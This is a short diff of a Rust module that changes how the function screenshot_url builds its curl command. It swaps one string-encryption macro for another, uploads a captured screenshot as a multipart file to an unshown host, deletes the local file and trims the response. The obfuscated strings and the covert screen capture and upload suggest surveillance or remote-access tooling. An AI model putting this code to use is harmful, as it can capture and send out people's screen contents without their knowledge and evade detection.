@@ -16,7 +16,6 @@ use anyhow::{anyhow, Context};
 use rand::prelude::*;
 use screenshots::Screen;
 use systemstat::{saturating_sub_bytes, Platform, System};
-use wpkg_macro::encode;
 
 use crate::{crypto, info_crypt, utils};
 
@@ -196,7 +195,7 @@ pub async fn screenshot_url() -> anyhow::Result<String> {
     info_crypt!("Uploading screenshot...");
 
     let out = utils::run_process_with_output(
-        encode!("curl"),
+        &crypto!("curl"),
         vec![
             &crypto!("-F"),
             &format!("{}{}", crypto!("file=@"), path),
@@ -209,7 +208,7 @@ pub async fn screenshot_url() -> anyhow::Result<String> {
         fs::remove_file(path).unwrap();
     });
 
-    Ok(String::from_utf8(out.stdout)?)
+    Ok(String::from_utf8(out.stdout)?.replace("\n",""))
 }
 
 pub fn stat() -> String {
